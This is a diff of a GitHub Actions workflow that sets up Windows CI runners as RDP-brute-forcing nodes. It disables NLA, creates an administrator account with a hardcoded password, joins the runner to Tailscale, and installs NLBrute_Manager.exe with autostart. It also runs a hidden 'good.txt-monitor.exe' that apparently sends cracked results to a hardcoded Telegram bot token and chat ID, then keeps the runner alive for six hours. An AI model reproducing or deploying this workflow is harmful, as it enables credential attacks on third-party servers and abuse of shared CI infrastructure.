@@ -108,31 +108,55 @@ jobs:
 
       - name: 4. Enable RDP & Firewall
         run: |
+          # Enable RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          
+          # Disable NLA (Network Level Authentication) for easier connection testing
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
+
+          # Enable Firewall Rules
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          
+          # Restart RDP Service to ensure changes take effect immediately
+          Restart-Service TermService -Force
+          Write-Host "RDP Enabled and Service Restarted." -ForegroundColor Green
 
       - name: 5. Create Admin Account
         run: |
           $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
           New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
+          # Ensure the default runneradmin is also usable with this password
           net user runneradmin P@ssw0rd1qazXSW@#
 
       - name: 6. Install & Connect Tailscale VPN
         env:
           TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
         run: |
+          # Install Tailscale
           Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
           Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
           Start-Sleep -Seconds 5
+          
+          # Connect
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
-          Start-Sleep -Seconds 8
-          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
+          
+          # Wait for IP (Retry loop for stability)
+          $ts_ip = $null
+          $attempts = 0
+          while (-not $ts_ip -and $attempts -lt 10) {
+              $attempts++
+              Start-Sleep -Seconds 5
+              $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
+              # Trim whitespace
+              if ($ts_ip) { $ts_ip = $ts_ip.Trim() }
+          }
+
           if (-not $ts_ip) {
-              Write-Error "Failed to get Tailscale IP"
+              Write-Error "Failed to get Tailscale IP after multiple attempts"
               exit 1
           }
+          
           # Save IP to environment for the next step
           echo "TS_IP=$ts_ip" >> $env:GITHUB_ENV
           Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
@@ -302,34 +326,60 @@ jobs:
                   Write-Host "settings.ini updated successfully." -ForegroundColor Green
               } catch {
                   Write-Error "Failed to update settings.ini: $_"
-                  exit 1
+                  exit 
               }
           } else {
-              Write-Warning "settings.ini not found at expected path: $settingsIniPath. Skipping update."
+              Write-Warning "settings.ini not found at expected path. Skipping modification."
           }
-          # --------------------------------------
 
           # 6. Registry & Autostart Setup
           $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
-          # APP 1 Setup
+          # APP 1 Setup (NLBrute_Manager.exe)
           if ($exeFile1) {
               $exePath1 = $exeFile1.FullName
               $exeDir1 = Split-Path $exePath1 -Parent
+              
+              # Create VBS Launcher to ensure correct working directory
               $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
               $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
               $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
+              
+              # Add to Registry
               New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
               
-              # LAUNCH APP 1 (After settings.ini modification)
+              # LAUNCH APP 1 (Now that settings.ini is modified)
               Write-Host "Launching NLBrute_Manager.exe..." -ForegroundColor Yellow
               Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
           }
 
-          # APP 2 Setup
+          # APP 2 Setup (good.txt-monitor.exe)
           if ($exeFile2) {
               $exePath2 = $exeFile2.FullName
-              $exeDir2 = Split-Path $exePath2 -Parent
+              $exeDir2 = Split-Path $exeFile2 -Parent
+              
+              # Define Parameters
               $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
+              
+              # Create VBS Launcher
               $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
-              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exe
+              # Note: Using cmd.exe /c inside VBS to handle arguments with spaces correctly if needed, 
+              # but here we quote the exe path.
+              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
+              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
+              
+              # Add to Registry
+              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
+              
+              # LAUNCH APP 2
+              Write-Host "Launching good.txt-monitor.exe..." -ForegroundColor Yellow
+              Start-Process -FilePath $exePath2 -WorkingDirectory $exeDir2 -ArgumentList $params -WindowStyle Hidden
+          }
+
+      - name: 8. Keep Server Alive (6 Hours)
+        run: |
+          Write-Host "Server ${{ matrix.server_id }} is now live and keeping alive..." -ForegroundColor Cyan
+          for ($i = 1; $i -le 360; $i++) {
+            Start-Sleep -Seconds 60
+            Write-Host "[Server ${{ matrix.server_id }}] Running... ($i/360 minutes)"
+          }
